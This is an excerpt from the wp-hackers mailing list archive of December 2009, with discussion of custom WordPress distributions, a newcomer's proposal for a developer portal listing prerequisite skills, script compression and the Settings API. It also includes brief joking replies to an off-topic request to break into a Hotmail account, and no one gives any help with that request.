> > > THEN I GET OUT PLEASE I REAL NEED IT IF I SENT YOU THE EMAIL OF THAT
> > > PERSONA CAN YOU HELP ME?
> > >
> > >
> > > THANKS BEST REGARDS
> > >
> > > CARLOS
> > >
> > > _________________________________________________________________
> > > Windows Live Hotmail: Your friends can get your Facebook updates, right
> > > from Hotmail?.
> > >
> >
> http://www.microsoft.com/middleeast/windows/windowslive/see-it-in-action/social-network-basics.aspx?ocid=PID23461::T:WLMTAGL:ON:WL:en-xm:SI_SB_4:092009
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> > --
> > Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
> >
> >
> > ------------------------------
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> >
> > End of wp-hackers Digest, Vol 59, Issue 85
> > ******************************************
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Fri Dec 18 04:56:52 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 17 Dec 2009 22:56:52 -0600
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com>
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>
	<e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com>
Message-ID: <467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>

On Dec 17, 2009, at 6:49 PM, Jeremy Clarke wrote:

> -1 to this idea.
> 
> If you can't do it with a plugin then work harder to work out a plugin
> solution by writing a core patch that adds the hooks you need instead
> of demanding the whole thing be in core.

I'm with Jeremy on this.

What you might do is write articles linking various plugins that collectively create a "package" of some sort.

For example, you might say "For this setup, get Plugin X (link), Plugin Y (link), and Plugin Z (link).  Now download this custom install script and put it in wp-content/install.php and run the install."

With that, you could do just about anything I can imagine along the lines of what you describe.  No need to fork WordPress Core.

And as Jeremy says, if you can't do it with a plugin, get help here, or get your patches up on Trac.  I've personally had a few patches in the last couple versions of WP, which are now part of WP 2.9 -- it can take time, but once you're in, you're in. :-)

Stephen

P.S. -- How to install a custom install script: <http://wpbits.wordpress.com/2007/08/10/automating-wordpress-customizations-the-installphp-way/>

-- 
Stephen Rider
http://striderweb.com/


From zamoose at gmail.com  Fri Dec 18 05:08:07 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Fri, 18 Dec 2009 00:08:07 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com> 
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com> 
	<e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com> 
	<467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>
Message-ID: <71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com>

On Thu, Dec 17, 2009 at 11:56 PM, Stephen Rider
<wp-hackers at striderweb.com>wrote:

>
> I'm with Jeremy on this.
>
> What you might do is write articles linking various plugins that
> collectively create a "package" of some sort.
>
> For example, you might say "For this setup, get Plugin X (link), Plugin Y
> (link), and Plugin Z (link).  Now download this custom install script and
> put it in wp-content/install.php and run the install."
>
> With that, you could do just about anything I can imagine along the lines
> of what you describe.  No need to fork WordPress Core.
>
> And as Jeremy says, if you can't do it with a plugin, get help here, or get
> your patches up on Trac.  I've personally had a few patches in the last
> couple versions of WP, which are now part of WP 2.9 -- it can take time, but
> once you're in, you're in. :-)
>
> Stephen
>
> P.S. -- How to install a custom install script: <
> http://wpbits.wordpress.com/2007/08/10/automating-wordpress-customizations-the-installphp-way/
> >
>
>
I was thinking far less forking and far more Fedora Spins (
http://spins.fedoraproject.org/) or Open Atrium (http://openatrium.com/)
wherein a custom workflow outside the general need/use case is
accommodated/tailored-to in order to make a software distro immediately more
useful to a subset of people.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From lists.automattic.com at callum-macdonald.com  Fri Dec 18 05:51:33 2009
From: lists.automattic.com at callum-macdonald.com (Callum Macdonald)
Date: Thu, 17 Dec 2009 23:51:33 -0600
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com>
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>
	<e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com>
	<467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>
	<71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com>
Message-ID: <1261115493.4549.23.camel@buna>

On Fri, 2009-12-18 at 00:08 -0500, Doug Stewart wrote:
> I was thinking far less forking and far more Fedora Spins (
> http://spins.fedoraproject.org/) or Open Atrium (http://openatrium.com/)
> wherein a custom workflow outside the general need/use case is
> accommodated/tailored-to in order to make a software distro immediately more
> useful to a subset of people.

Excellently put, exactly what I had in mind. In retrospect, I think I
was being overly dramatic using the word fork. I was thinking of custom
rolled versions rather than full on forks (although things might move in
that direction).

Are you interested in maintaining a set of patches to roll a custom
spin?

Warmly - Callum.



From rhonda1964 at gmail.com  Fri Dec 18 06:29:38 2009
From: rhonda1964 at gmail.com (Rhonda Johnson)
Date: Fri, 18 Dec 2009 00:29:38 -0600
Subject: [wp-hackers] Developer Portal
Message-ID: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>

I want very much to share my thoughts with everyone on the matter of the
developer portal so I joined the mailing list to read up on what others are
saying.  I have actually learned a lot just from reading the mailing list
archives all day today.  Many people have offered many great suggestions
that I agree with and I believe I do have some things to add ass well.




From rhonda1964 at gmail.com  Fri Dec 18 06:39:57 2009
From: rhonda1964 at gmail.com (Rhonda Johnson)
Date: Fri, 18 Dec 2009 00:39:57 -0600
Subject: [wp-hackers] Developer Portal
In-Reply-To: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>
References: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>
Message-ID: <ae6973a90912172239u448c0143x11db42ec77333ed8@mail.gmail.com>

I'm not sure why my post was cut off.  Trying again.  Sorry.

On Fri, Dec 18, 2009 at 12:29 AM, Rhonda Johnson <rhonda1964 at gmail.com>wrote:

> I want very much to share my thoughts with everyone on the matter of the
> developer portal so I joined the mailing list to read up on what others are
> saying.  I have actually learned a lot just from reading the mailing list
> archives all day today.  Many people have offered many great suggestions
> that I agree with and I believe I do have some things to add ass well.
>
> From my point of view, even 2 years into working with self
> hosted WordPress, on Godaddy, and locally hosted, on my laptop, the thing
> I would still find most useful to this day is a list of prerequisites I
> should master before tackling any particular tasks.  The ultimate task
> would be to call myself aWordPress Developer so that the master list of
> prerequisites leads to, well, mastery.
>
> I would suggest that this master list of prerequisites assume only that the
> user knows how to use a computer.  I'm not asking for tutorials on
> everything from HTML to complete mastery, there is plenty of that stuff out
> there already.  I'm just asking for a complete list of prerequisites.  I
> would ask that you compile this list with the following audience in mind:
>
> A 14-year-old high school freshman who has had his/her hands on computers
> practically since birth.  This high school freshman is comfortable with a
> keyboard and mouse, is familiar with many software applications and learns
> them intuitively, navigating the internet is second nature but programming
> is not,(yet.)  This freshman has just discovered WordPress and decides she
> wants to be a WordPress Developer when she grows up.  He/she wants to
> someday be able to not only build entire websites from the ground up but to
> also be able to contribute to the core development of WordPress and maybe
> even other open source projects.
>
>  What are the skills this potential future WordPress developer can begin to
> develop?  (I?m not a 14-year-old high school student, I just believe that
> targeting the list of prerequisites towards a computer
> savvy 14-year-old budding future WordPress developer is more likely to
> inspiring a complete list of prerequisite skills than asking you to target
> the list to people who are already skilled developers.)
>
> WHERE TO BEGIN
>
> WORDPRESS.COM - What is it and what are the skills that can be learned
> there?
>
> BLOGGING, CONTENT MANAGEMENT, PLUGINS, WIDGETS, ETC
>
> What skills and level of mastery is necessary for what tasks?
>
> SELF HOSTED WORDPRESS
>
> WORDPRESS.ORG
>
> WHAT IS SELF HOSTING - the knowledge and skills one needs to master to self
> host.
>
> WORDPRESS AS BLOGGING PLATFORM -
>
>  WORDPRESS AS CMS -HTML, XHTML, CSS, PHP, MYSQL,
>
> Here it would be nice to know what skills does one need to acquire BEFORE
> running to the WP community to ask a question such as "how do I get my posts
> to sort alphabetically by category?" or, "how do I change the colors in my
> theme?" etc.
>
> What are the concepts necessary to understand prior to customizing a theme?
>
> What are the skills necessary to master before I attempt to build plugins?
>
> What level of understanding should I have about what concepts before I
> attempt to submit bug report?
>
>  A skill set that might be a prerequisite of participating in the community
> is OPEN SOURCE ETIQUETTE.  There should be a course.
>
> Give back to the community
>
> Be respectful
>
> Do some research before participating in discussions or asking questions.
>
> Be sure you have achieved mastery of the prerequisites for the related
> topics or tasks before asking questions or trying to participate. (This
> assumes that prerequisites are clearly spelled out somewhere.)
>
> (This is not meant to be a complete list, just a place to start.)
>
> All I'm asking is for a list of skills necessary to move up to the next
> level, whatever that next level happens to be, customizing themes,
> building plugins, contributing patches, etc.
>
>  Here I?d just like to add that I am a big fan of the entire WP community.
> Thank you all so much!  There is already a great deal of information out
> there.  For a developer portal I don?t see any reason to repeat all the
> information that?s already out there, just tell me what skills I need to
> master and maybe point me in the right direction.  Anything above and beyond
> that is just awesomeness on the part of the community.
>
> Nice to meet you all,
>
> Rhonda
>
> --
> http://everything-south-padre-island.com
>



-- 
http://everything-south-padre-island.com

From lists at rotorised.com  Fri Dec 18 07:33:02 2009
From: lists at rotorised.com (Ryan McCue)
Date: Fri, 18 Dec 2009 17:33:02 +1000
Subject: [wp-hackers] Developer Portal
In-Reply-To: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>
References: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>
Message-ID: <4B2B302E.3050204@rotorised.com>

Rhonda Johnson wrote:
> What are the skills this potential future WordPress developer can begin to
> develop?  (I?m not a 14-year-old high school student, I just believe that
> targeting the list of prerequisites towards a computer
> savvy 14-year-old budding future WordPress developer is more likely to
> inspiring a complete list of prerequisite skills than asking you to target
> the list to people who are already skilled developers.)
>   

I, on the other hand, am 16, and I've been working with WordPress since
I was 14. I had fairly good knowledge of PHP at that point, and I
basically learnt by diving into existing plugins, themes, and into the
core itself. I found it wasn't too hard.

-- 
Ryan McCue
<http://ryanmccue.info/>


From jayarjo at gmail.com  Fri Dec 18 07:58:28 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 18 Dec 2009 11:58:28 +0400
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
Message-ID: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>

Is there any established documentation about this feature?

-- 
Davit Barbakadze

From lynne.pope at gmail.com  Fri Dec 18 08:21:22 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Fri, 18 Dec 2009 21:21:22 +1300
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <1261115493.4549.23.camel@buna>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com> 
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com> 
	<e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com> 
	<467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>
	<71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com> 
	<1261115493.4549.23.camel@buna>
Message-ID: <427667db0912180021t13da8b63q87e91f87cceb3b4b@mail.gmail.com>

2009/12/18 Callum Macdonald <lists.automattic.com at callum-macdonald.com>

>
> Are you interested in maintaining a set of patches to roll a custom
> spin?
>

I support this concept but (and its a BIG BUT) for it to be successful it
needs at least a couple of very good, highly-committed coders to take it up
and run with it.

I've been maintaining a private "fork" of WordPress since 2.6.5 because the
UI changes in 2.7 didn't suit some people (making WordPress less
accessible). I can tell you it is a LOT of very hard work. Coding is the
smallest part of it and doesn't take anywhere near as much time as
monitoring the core changes does. Keeping track of core changes and running
diffs all the time is a real chore if you have others depending on you
keeping up-to-date.

If a couple of people are prepared for the long-term commitment to this, and
understand how much work is involved, then it could be a really good thing
for the WordPress community. I don't have the time but applaud anyone who
goes for it. Handled properly this could help, not hinder, WordPress
development.

Lynne

From photofantaisie at gmail.com  Fri Dec 18 08:26:00 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Fri, 18 Dec 2009 09:26:00 +0100
Subject: [wp-hackers] Settings API: Showing errors if validation fails
In-Reply-To: <e1202cb10912171300p33d1478ch2cb36b12f19f5c2b@mail.gmail.com>
References: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>
	<9dd057850912162318h265eed11g18903c2b1b596849@mail.gmail.com>
	<e1202cb10912171300p33d1478ch2cb36b12f19f5c2b@mail.gmail.com>
Message-ID: <9dd057850912180026h75e56e7fn4a2a34cb7cf43328@mail.gmail.com>

I haven't been through all your code, or trac ticket, yet, but I like the
approach. Building this in to the Settings API seems an emminently sensible
thing to do, for all the reasons you describe in your trac ticket.

+1 from me. :-)

In the meantime, I'm going to play with your interim solution code and see
how it works for me. Thanks, Jeremy.

From rhonda1964 at gmail.com  Fri Dec 18 08:30:31 2009
From: rhonda1964 at gmail.com (Rhonda Johnson)
Date: Fri, 18 Dec 2009 02:30:31 -0600
Subject: [wp-hackers] Developer Portal
In-Reply-To: <4B2B302E.3050204@rotorised.com>
References: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>
	<4B2B302E.3050204@rotorised.com>
Message-ID: <ae6973a90912180030l5e2ea2a4v1e9bb194680a8a1b@mail.gmail.com>

> What are the skills this potential future WordPress developer can begin to
> > develop?  (I?m not a 14-year-old high school student, I just believe that
> > targeting the list of prerequisites towards a computer
> > savvy 14-year-old budding future WordPress developer is more likely to
> > inspiring a complete list of prerequisite skills than asking you to
> target
> > the list to people who are already skilled developers.)
> >
>
> I, on the other hand, am 16, and I've been working with WordPress since
> I was 14. I had fairly good knowledge of PHP at that point, and I
> basically learnt by diving into existing plugins, themes, and into the
> core itself. I found it wasn't too hard.
>

OMG, I guess my target audience example really backfired on me.  I should
have realized that there would be a 16 year old hacker here who cut his baby
teeth on PHP.
But you are right, Ryan, it's not that hard.  That is more or less my point.
 I don't really need, want or expect the WP community to hold my hand and
teach me everything I need to know but a nice list of tasks to master to be
able to accomplish certain goals, now that's what I really need.

You know what's ironic, Ryan?  I've been using computers since long before
you were born.  One of my very first real jobs was setting up a data base
for a crap load of data that had been collected over a very long period of
time about a wide variety of subjects.  My training consisted of being
handed a list of commands, several typed pages of commands.  Maybe one line
of text explaining what each command meant.  This was long before Windows
and it was pre relational db when I first started.  I was able to figure it
out much faster and easier than I am getting WordPress.  But I will
get WordPress.  I am getting WordPress.

My goal is not necessarily to become a developer, I want to be a competent
publisher.  I am attracted to WordPress because it is a Data Management
System.  I know y'all call it a CMS but from my POV it's a DMS.  My goal is
to master WordPress to the point where I can competently publish and manage
data on the internet.  Furthermore I want to be able to ask intelligent
questions and I want to have enough background information to understand the
answers.  I just need sort of a map to follow to learn all the different
parts and pieces of information I need to know to accomplish my goals.

Nice meeting you Ryan.

> --
> Ryan McCue
> <http://ryanmccue.info/>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://everything-south-padre-island.com

From scribu at gmail.com  Fri Dec 18 10:30:59 2009
From: scribu at gmail.com (scribu)
Date: Fri, 18 Dec 2009 12:30:59 +0200
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
Message-ID: <349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>

Compression is done offline, using YUI compressor.

Concatenation is available only for scripts shipped with WP Core.


On Fri, Dec 18, 2009 at 9:58 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> Is there any established documentation about this feature?
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From spockers at gmail.com  Fri Dec 18 14:01:37 2009
From: spockers at gmail.com (Tim and Farah Jones)
Date: Fri, 18 Dec 2009 09:01:37 -0500
Subject: [wp-hackers]
	=?iso-8859-1?q?=B4=B4i_need_urgente_a_password_of_a_?=
	=?iso-8859-1?q?hotmail_can_anybody_help_me=3F=B4=B4?=
In-Reply-To: <71ddd7490912171341r2719140epbc465e6875ae2dbd@mail.gmail.com>
References: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>
	<op.u43oeea6spxmuu@dd32>
	<71ddd7490912171341r2719140epbc465e6875ae2dbd@mail.gmail.com>
Message-ID: <b066747d0912180601l305f7620l4626b051f704b51d@mail.gmail.com>

Obviously it was a typo, he meant KEYLOOGIE, which is a wad of phlegm
ejected forcefully onto one's keyboard :)

On Thu, Dec 17, 2009 at 4:41 PM, Doug Stewart <zamoose at gmail.com> wrote:

> One does find oneself wondering what, precisely, a "KEYLOOGER" is.
>
> *grin*
>
> --
> -Doug
> @zamoose
> http://literalbarrage.org/blog/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ciaran at ciarang.com  Fri Dec 18 14:04:40 2009
From: ciaran at ciarang.com (Ciaran Gultnieks)
Date: Fri, 18 Dec 2009 14:04:40 +0000
Subject: [wp-hackers]
 =?iso-8859-1?q?=B4=B4i_need_urgente_a_password_of_a_?=
 =?iso-8859-1?q?hotmail_can_anybody_help_me=3F=B4=B4?=
In-Reply-To: <b066747d0912180601l305f7620l4626b051f704b51d@mail.gmail.com>
References: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>	<op.u43oeea6spxmuu@dd32>	<71ddd7490912171341r2719140epbc465e6875ae2dbd@mail.gmail.com>
	<b066747d0912180601l305f7620l4626b051f704b51d@mail.gmail.com>
Message-ID: <4B2B8BF8.6010409@ciarang.com>


On 18/12/09 14:01, Tim and Farah Jones wrote:
> Obviously it was a typo, he meant KEYLOOGIE, which is a wad of phlegm
> ejected forcefully onto one's keyboard :)

I assumed he had one of those already, stuck under the shift key.


From zamoose at gmail.com  Fri Dec 18 14:20:43 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Fri, 18 Dec 2009 09:20:43 -0500
Subject: [wp-hackers]
	=?iso-8859-1?q?=B4=B4i_need_urgente_a_password_of_a_?=
	=?iso-8859-1?q?hotmail_can_anybody_help_me=3F=B4=B4?=
In-Reply-To: <b066747d0912180601l305f7620l4626b051f704b51d@mail.gmail.com>
References: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>
	<op.u43oeea6spxmuu@dd32> 
	<71ddd7490912171341r2719140epbc465e6875ae2dbd@mail.gmail.com> 
	<b066747d0912180601l305f7620l4626b051f704b51d@mail.gmail.com>
Message-ID: <71ddd7490912180620o74f02cb4j8d0f6409cfc8605b@mail.gmail.com>

On Fri, Dec 18, 2009 at 9:01 AM, Tim and Farah Jones <spockers at gmail.com>wrote:

> Obviously it was a typo, he meant KEYLOOGIE, which is a wad of phlegm
> ejected forcefully onto one's keyboard :)
>
>
Ahh, a bit like Monitor Coffee, eh wot?

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From wordpress at santosj.name  Fri Dec 18 14:24:54 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 18 Dec 2009 08:24:54 -0600
Subject: [wp-hackers] Developer Portal
In-Reply-To: <ae6973a90912180030l5e2ea2a4v1e9bb194680a8a1b@mail.gmail.com>
References: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>	<4B2B302E.3050204@rotorised.com>
	<ae6973a90912180030l5e2ea2a4v1e9bb194680a8a1b@mail.gmail.com>
Message-ID: <4B2B90B6.5060504@santosj.name>

To be a master I expect would take a long time and is a really long 
list. What you are looking at isn't just WordPress, but a general set of 
skills related to computer systems management, server management, 
protocol, and probably most important of all is experience.

I would say the number one asset to becoming a master is the willingness 
to learn, experiment, fail, and spend the time needed to succeed. I 
didn't know very much about Subversion when I started working with it 
other than the simple command svn checkout 
http://core.svn.wordpress.org/tags/2.3.1, but after you understand that 
concept the other Subversion commands become a little bit clearer. Then 
maintaining a Subversion repository for over 2 years with a range of 
mod_dav_svn, svnserve, authentication methods, branching, etc.

What I'm trying to say, is that if you wish to be a master of WordPress, 
you need to dive into other computer related subjects. I'm not saying 
you need to be able to build from the ground up a computer, it may clear 
a few things up, but generally doesn't help with working with WordPress. 
I suppose intelligence (or more particular IQ) is also a factor. I'm 
lucky I started at 11, because with my average IQ and the amount of time 
I have currently, I would never be able to match Ryan McCue and probably 
would be doing something entirely different. I believe those who fail 
with my range of IQ work in politics or at factories. Over time certain 
similarities form between concepts and that helps. Generally, the higher 
the IQ, the faster one would be able to learn a given concept or task [1].

I will also say that if you wish to be a master in WordPress or even a 
WordPress developer, then I think you are doing it wrong. Being the 
master of one makes you a specialist and while that is fine in and of 
itself, it is extremely limiting. A master of computer languages, server 
management, and computers can probably overtake you without any 
knowledge of WordPress and by applying what they already know, whereas 
it would be extremely difficult to branch off to other web applications 
after WordPress dies. Of course, COBOL is still in demand after it died 
itself, so well, there might be hope.

Jacob Santos

[1] As an aside, I both hate geniuses and have tremendous respect for 
them. I hate them because it takes me 2 or 3 times longer to learn 
something and sometimes 10 times as long, but I also respect them, 
because they are capable of creating something new that I can eventually 
reproduce in my work and designing something interestingly than I'm 
capable of.

Rhonda Johnson wrote:
>> What are the skills this potential future WordPress developer can begin to
>>     
>>> develop?  (I?m not a 14-year-old high school student, I just believe that
>>> targeting the list of prerequisites towards a computer
>>> savvy 14-year-old budding future WordPress developer is more likely to
>>> inspiring a complete list of prerequisite skills than asking you to
>>>       
>> target
>>     
>>> the list to people who are already skilled developers.)
>>>
>>>       
>> I, on the other hand, am 16, and I've been working with WordPress since
>> I was 14. I had fairly good knowledge of PHP at that point, and I
>> basically learnt by diving into existing plugins, themes, and into the
>> core itself. I found it wasn't too hard.
>>
>>     
>
> OMG, I guess my target audience example really backfired on me.  I should
> have realized that there would be a 16 year old hacker here who cut his baby
> teeth on PHP.
> But you are right, Ryan, it's not that hard.  That is more or less my point.
>  I don't really need, want or expect the WP community to hold my hand and
> teach me everything I need to know but a nice list of tasks to master to be
> able to accomplish certain goals, now that's what I really need.
>
> You know what's ironic, Ryan?  I've been using computers since long before
> you were born.  One of my very first real jobs was setting up a data base
> for a crap load of data that had been collected over a very long period of
> time about a wide variety of subjects.  My training consisted of being
> handed a list of commands, several typed pages of commands.  Maybe one line
> of text explaining what each command meant.  This was long before Windows
> and it was pre relational db when I first started.  I was able to figure it
> out much faster and easier than I am getting WordPress.  But I will
> get WordPress.  I am getting WordPress.
>
> My goal is not necessarily to become a developer, I want to be a competent
> publisher.  I am attracted to WordPress because it is a Data Management
> System.  I know y'all call it a CMS but from my POV it's a DMS.  My goal is
> to master WordPress to the point where I can competently publish and manage
> data on the internet.  Furthermore I want to be able to ask intelligent
> questions and I want to have enough background information to understand the
> answers.  I just need sort of a map to follow to learn all the different
> parts and pieces of information I need to know to accomplish my goals.
>
> Nice meeting you Ryan.
>
>   
>> --
>> Ryan McCue
>> <http://ryanmccue.info/>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
>
>
>
>   

From rhonda1964 at gmail.com  Fri Dec 18 18:05:11 2009
From: rhonda1964 at gmail.com (Rhonda Johnson)
Date: Fri, 18 Dec 2009 12:05:11 -0600
Subject: [wp-hackers] Developer Portal
In-Reply-To: <4B2B90B6.5060504@santosj.name>
References: <ae6973a90912172229r1d27cf03y6ffc0b9a9caa4ee6@mail.gmail.com>
	<4B2B302E.3050204@rotorised.com>
	<ae6973a90912180030l5e2ea2a4v1e9bb194680a8a1b@mail.gmail.com>
	<4B2B90B6.5060504@santosj.name>
Message-ID: <ae6973a90912181005ja9d935ei679edef2bf2c1e70@mail.gmail.com>

On Fri, Dec 18, 2009 at 8:24 AM, Jacob Santos <wordpress at santosj.name>wrote:

> To be a master I expect would take a long time and is a really long list.
> What you are looking at isn't just WordPress, but a general set of skills
> related to computer systems management, server management, protocol, and
> probably most important of all is experience.
>

Yes.  Exactly.  I realized within minutes of researching Wordpress a couple
of years ago that it was not going to be the easiest CMS to master.  I
choose WP because it is clearly very powerful.  Matt's question was about
what resources would a developer just getting started with Wordpress most
benefit  My answer is a clearly defined list of minimum skill levels
necessary to accomplish a task.

 For example, just getting started with self hosting one needs to at least
understand a certain amount about servers, ftp, installing and setting up a
database, maybe even something about file permissions.  I'm sure I'm
forgetting stuff.  It's easy to forget steps to a process you've done so
many times that it's become second nature.  That's the point.  And I know
that the skills necessary to self host are already fairly well documented
and easy to find.  I was just using it as an example because it is well
documented and easy to find.  That easy to find and well documented piece of
the puzzle probably keeps a lot of people from jumping onto a list like this
one and asking a question like "I've downloaded a copy of WordPress from
Wordpress.org, now what do I do?"

>
> I would say the number one asset to becoming a master is the willingness to
> learn, experiment, fail, and spend the time needed to succeed.
>

I totally agree.

>
> What I'm trying to say, is that if you wish to be a master of WordPress,
> you need to dive into other computer related subjects. I'm not saying you
> need to be able to build from the ground up a computer, it may clear a few
> things up, but generally doesn't help with working with WordPress.
>

Again, I totally agree.  I do know how to build a computer from all the
various parts and pieces and you are right, knowing how to do that does
nothing to help me with Wordpress.

>
> I will also say that if you wish to be a master in WordPress or even a
> WordPress developer, then I think you are doing it wrong. Being the master
> of one makes you a specialist and while that is fine in and of itself, it is
> extremely limiting.
>

Agree again.  I only focused on WP because Matt's question was about a
Developer Portal for WP.

>
> Jacob Santos
>
>
> Nice to meet you, Jacob


>
> Rhonda Johnson wrote:
>
>> What are the skills this potential future WordPress developer can begin to
>>>
>>>
>>>> develop?  (I?m not a 14-year-old high school student, I just believe
>>>> that
>>>> targeting the list of prerequisites towards a computer
>>>> savvy 14-year-old budding future WordPress developer is more likely to
>>>> inspiring a complete list of prerequisite skills than asking you to
>>>>
>>>>
>>> target
>>>
>>>
>>>> the list to people who are already skilled developers.)
>>>>
>>>>
>>>>
>>> I, on the other hand, am 16, and I've been working with WordPress since
>>> I was 14. I had fairly good knowledge of PHP at that point, and I
>>> basically learnt by diving into existing plugins, themes, and into the
>>> core itself. I found it wasn't too hard.
>>>
>>>
>>>
>>
>> OMG, I guess my target audience example really backfired on me.  I should
>> have realized that there would be a 16 year old hacker here who cut his
>> baby
>> teeth on PHP.
>> But you are right, Ryan, it's not that hard.  That is more or less my
>> point.
>>  I don't really need, want or expect the WP community to hold my hand and
>> teach me everything I need to know but a nice list of tasks to master to
>> be
>> able to accomplish certain goals, now that's what I really need.
>>
>> You know what's ironic, Ryan?  I've been using computers since long before
>> you were born.  One of my very first real jobs was setting up a data base
>> for a crap load of data that had been collected over a very long period of
>> time about a wide variety of subjects.  My training consisted of being
>> handed a list of commands, several typed pages of commands.  Maybe one
>> line
>> of text explaining what each command meant.  This was long before Windows
>> and it was pre relational db when I first started.  I was able to figure
>> it
>> out much faster and easier than I am getting WordPress.  But I will
>> get WordPress.  I am getting WordPress.
>>
>> My goal is not necessarily to become a developer, I want to be a competent
>> publisher.  I am attracted to WordPress because it is a Data Management
>> System.  I know y'all call it a CMS but from my POV it's a DMS.  My goal
>> is
>> to master WordPress to the point where I can competently publish and
>> manage
>> data on the internet.  Furthermore I want to be able to ask intelligent
>> questions and I want to have enough background information to understand
>> the
>> answers.  I just need sort of a map to follow to learn all the different
>> parts and pieces of information I need to know to accomplish my goals.
>>
>> Nice meeting you Ryan.
>>
>>
>>
>>> --
>>> Ryan McCue
>>> <http://ryanmccue.info/>
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>>
>>
>>
>>
>>
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://everything-south-padre-island.com

From jer at simianuprising.com  Fri Dec 18 18:57:04 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 18 Dec 2009 13:57:04 -0500
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <349fe48b0912151045i516383cam5ea881a66c82905c@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
	<4B25F1CE.9060805@laptoptips.ca>
	<9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>
